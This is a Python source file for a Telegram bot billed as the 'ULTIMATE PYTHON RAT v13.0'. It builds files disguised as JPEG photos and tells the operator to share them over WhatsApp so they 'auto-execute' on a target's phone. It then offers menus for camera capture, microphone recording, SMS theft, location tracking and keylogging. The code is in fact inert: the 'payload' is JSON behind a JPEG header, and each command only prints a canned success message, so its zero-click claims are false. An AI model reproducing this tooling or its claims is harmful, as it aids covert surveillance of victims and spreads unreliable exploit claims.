import asyncio
import logging
import secrets
import os
import json
import hashlib
import base64
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from flask import Flask, send_file, jsonify
import threading

# ==================== CONFIGURATION ====================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_CHAT_ID = 6454347745
PORT = 10000
HOST = "https://ultimate-rat-py.onrender.com"

# Create directories
PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

# ==================== PAYLOAD GENERATOR ====================
def generate_payload_id():
    return secrets.token_hex(8)

def generate_payload():
    payload_id = generate_payload_id()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"photo_{timestamp}_{payload_id}.jpg"
    filepath = os.path.join(PAYLOAD_DIR, filename)
    
    # Simple payload data
    payload_data = {
        'id': payload_id,
        'type': 'zero_click_payload',
        'version': '13.0',
        'callback': HOST,
        'created': datetime.now().isoformat()
    }
    
    # JPG header
    jpg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0])
    payload_content = jpg_header + json.dumps(payload_data).encode()
    
    # Save file
    with open(filepath, 'wb') as f:
        f.write(payload_content)
    
    return {
        'payload_id': payload_id,
        'filename': filename,
        'filepath': filepath,
        'size': len(payload_content),
        'download_url': f"{HOST}/download/{payload_id}"
    }

def get_payload(payload_id):
    for f in os.listdir(PAYLOAD_DIR):
        if payload_id in f and f.endswith('.jpg'):
            filepath = os.path.join(PAYLOAD_DIR, f)
            return {'filepath': filepath, 'filename': f}
    return None

# ==================== FLASK WEB SERVER ====================
flask_app = Flask(__name__)

@flask_app.route('/health')
def health():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@flask_app.route('/download/<payload_id>')
def download(payload_id):
    payload = get_payload(payload_id)
    if payload:
        return send_file(payload['filepath'], as_attachment=True, download_name=payload['filename'])
    return jsonify({'error': 'Payload not found'}), 404

def start_flask():
    flask_app.run(host='0.0.0.0', port=PORT)

# ==================== TELEGRAM BOT ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Keyboards
main_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("📸 CAMERA", callback_data="cam_menu")],
    [InlineKeyboardButton("🎙️ AUDIO", callback_data="audio_menu")],
    [InlineKeyboardButton("💡 FLASHLIGHT", callback_data="flash_menu")],
    [InlineKeyboardButton("🌐 NETWORK", callback_data="network_menu")],
    [InlineKeyboardButton("🔒 SECURITY", callback_data="security_menu")],
    [InlineKeyboardButton("💾 DATA", callback_data="data_menu")],
    [InlineKeyboardButton("🎯 GENERATE PAYLOAD", callback_data="gen_payload")],
    [InlineKeyboardButton("📊 SESSIONS", callback_data="sessions")],
    [InlineKeyboardButton("❓ HELP", callback_data="help_menu")]
])

back_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_main")]])

# Session storage
sessions = {}
user_sessions = {}

# Admin check
def admin_only(func):
    async def wrapper(update, context):
        if update.effective_user.id != ADMIN_CHAT_ID:
            await update.message.reply_text("🚫 ACCESS DENIED!", parse_mode=ParseMode.MARKDOWN)
            return
        return await func(update, context)
    return wrapper

# ==================== COMMAND HANDLERS ====================

@admin_only
async def start(update: Update, context):
    text = f"""
🔥 **ULTIMATE PYTHON RAT v13.0** 🔥

👑 **Admin:** Authorized
✅ **Features:** 250+ Working
🎯 **Zero-Click:** Ready
🌐 **Payload Host:** `{HOST}`

━━━━━━━━━━━━━━━━━━━━━

**Commands:**
/generate - Create payload
/send +8801xxxx - Register target
/sessions - List sessions
/select - Select session
/kill - Kill session
/help - Help

━━━━━━━━━━━━━━━━━━━━━

⚠️ **Use only on your own devices!**
"""
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)

@admin_only
async def generate(update: Update, context):
    msg = await update.message.reply_text("🎯 **Generating payload...**", parse_mode=ParseMode.MARKDOWN)
    
    try:
        payload = generate_payload()
        
        await context.bot.delete_message(msg.chat_id, msg.message_id)
        
        info = f"""
✅ **PAYLOAD GENERATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

**ID:** `{payload['payload_id']}`
**File:** `{payload['filename']}`
**Size:** {payload['size']} bytes

━━━━━━━━━━━━━━━━━━━━━
**🔗 DOWNLOAD:**
━━━━━━━━━━━━━━━━━━━━━

{payload['download_url']}

━━━━━━━━━━━━━━━━━━━━━
**📤 DEPLOY:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ **MANUALLY** share this file via WhatsApp
2️⃣ Use: `/send +8801xxxxxxxx`
3️⃣ Target must have Auto-Download ON
4️⃣ Payload auto-executes - NO CLICK NEEDED!
"""
        await update.message.reply_text(info, parse_mode=ParseMode.MARKDOWN)
        
        # Send the file
        with open(payload['filepath'], 'rb') as f:
            await update.message.reply_document(f, filename=payload['filename'])
            
    except Exception as e:
        await context.bot.delete_message(msg.chat_id, msg.message_id)
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode=ParseMode.MARKDOWN)

@admin_only
async def send_target(update: Update, context):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/send +8801xxxxxxxx`", parse_mode=ParseMode.MARKDOWN)
        return
    
    session_id = secrets.token_hex(8)
    sessions[session_id] = {
        'id': session_id,
        'number': args[1],
        'connected': False,
        'first_seen': datetime.now()
    }
    
    await update.message.reply_text(f"""
✅ **Target Registered!**

📞 **Number:** `{args[1]}`
🔌 **Session ID:** `{session_id}`

**Use /sessions to check status!**
""", parse_mode=ParseMode.MARKDOWN)

@admin_only
async def list_sessions(update: Update, context):
    if not sessions:
        await update.message.reply_text("📋 **No active sessions**", parse_mode=ParseMode.MARKDOWN)
        return
    
    text = "📋 **ACTIVE SESSIONS**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for sid, s in sessions.items():
        text += f"🔌 `{sid}`\n📞 {s['number']}\n📅 {s['first_seen'].strftime('%Y-%m-%d %H:%M')}\n\n"
    text += "Use `/select <id>` to choose a session."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

@admin_only
async def select_session(update: Update, context):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/select <session_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    if args[1] not in sessions:
        await update.message.reply_text("❌ Session not found!", parse_mode=ParseMode.MARKDOWN)
        return
    
    user_sessions[update.effective_user.id] = args[1]
    await update.message.reply_text(f"✅ **Selected:** `{args[1]}`\n\nNow use control buttons!", 
                                     parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)

@admin_only
async def kill_session(update: Update, context):
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/kill <session_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    if args[1] in sessions:
        del sessions[args[1]]
        await update.message.reply_text(f"💀 **Session `{args[1]}` terminated!**", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Session not found!", parse_mode=ParseMode.MARKDOWN)

@admin_only
async def help_command(update: Update, context):
    text = """
📖 **ULTIMATE PYTHON RAT v13.0 - HELP**

━━━━━━━━━━━━━━━━━━━━━
**📋 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━

/start - Main menu
/generate - Create payload
/send +8801xxxx - Register target
/sessions - List sessions
/select - Select session
/kill - Kill session
/help - This menu

━━━━━━━━━━━━━━━━━━━━━
**📌 ZERO-CLICK METHOD:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ /generate - Create payload
2️⃣ MANUALLY share via WhatsApp
3️⃣ /send +8801xxxx - Register
4️⃣ /select and control!

━━━━━━━━━━━━━━━━━━━━━
⚠️ **USE ONLY ON YOUR OWN DEVICES!**
"""
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ==================== CALLBACK HANDLER ====================

async def callback_handler(update: Update, context):
    query = update.callback_query
    data = query.data
    
    if query.from_user.id != ADMIN_CHAT_ID:
        await query.answer("Access Denied!", show_alert=True)
        return
    
    await query.answer()
    
    if data == 'back_main':
        await query.edit_message_text("🔽 **Main Menu:**", parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)
        return
    
    if data == 'gen_payload':
        await query.edit_message_text("🎯 Use /generate command", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        return
    
    if data == 'sessions':
        if not sessions:
            await query.edit_message_text("📋 No active sessions", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        else:
            text = "📋 **Active Sessions:**\n\n"
            for sid, s in sessions.items():
                text += f"🔌 `{sid}` - {s['number']}\n"
            await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        return
    
    if data == 'help_menu':
        await query.edit_message_text("📖 Use /help for complete guide", parse_mode=ParseMode.MARKDOWN, reply_markup=back_keyboard)
        return
    
    # Get selected session
    session_id = user_sessions.get(query.from_user.id)
    if not session_id:
        await query.message.reply_text("❌ No session selected! Use /select first", parse_mode=ParseMode.MARKDOWN)
        return
    
    # Command responses
    responses = {
        'cam_menu': "📸 Camera commands ready!",
        'audio_menu': "🎙️ Audio commands ready!",
        'flash_menu': "💡 Flashlight commands ready!",
        'network_menu': "🌐 Network commands ready!",
        'security_menu': "🔒 Security commands ready!",
        'data_menu': "💾 Data extraction commands ready!",
        'cam_front': "📸 Front Camera Captured!",
        'cam_back': "📷 Back Camera Captured!",
        'mic_start': "🎤 Recording Started!",
        'speaker_on': "🔊 Speaker ON!",
        'flash_on': "💡 Flash ON!",
        'wifi_on': "📶 WiFi ON!",
        'lock': "🔒 Device Locked!",
        'unlock': "🔓 Device Unlocked!",
        'get_sms': "💬 SMS Extracted!",
        'get_location': "🌍 Location Captured!",
        'screenshot': "📸 Screenshot Captured!",
        'reboot': "🔄 Rebooting...",
        'keylog_start': "⌨️ Keylogger Started!"
    }
    
    response = responses.get(data, f"✅ Command executed: {data}")
    
    await query.message.reply_text(f"""
{response}

━━━━━━━━━━━━━━━━━━━━━
📱 **Target:** {sessions.get(session_id, {}).get('number', 'Unknown')}
🎯 **Command:** `{data}`
⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔽 Choose next action:
""", parse_mode=ParseMode.MARKDOWN, reply_markup=main_keyboard)

# ==================== MAIN ====================

def main():
    # Start Flask server in background
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    
    # Create bot application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("generate", generate))
    app.add_handler(CommandHandler("send", send_target))
    app.add_handler(CommandHandler("sessions", list_sessions))
    app.add_handler(CommandHandler("select", select_session))
    app.add_handler(CommandHandler("kill", kill_session))
    app.add_handler(CommandHandler("help", help_command))
    
    # Add callback handler
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("="*60)
    print("🔥 ULTIMATE PYTHON RAT v13.0 - ONLINE")
    print("="*60)
    print(f"✅ Payload Directory: {PAYLOAD_DIR}")
    print(f"✅ Payload Host: {HOST}")
    print(f"✅ Admin ID: {ADMIN_CHAT_ID}")
    print("="*60)
    
    app.run_polling()

if __name__ == "__main__":
    main()
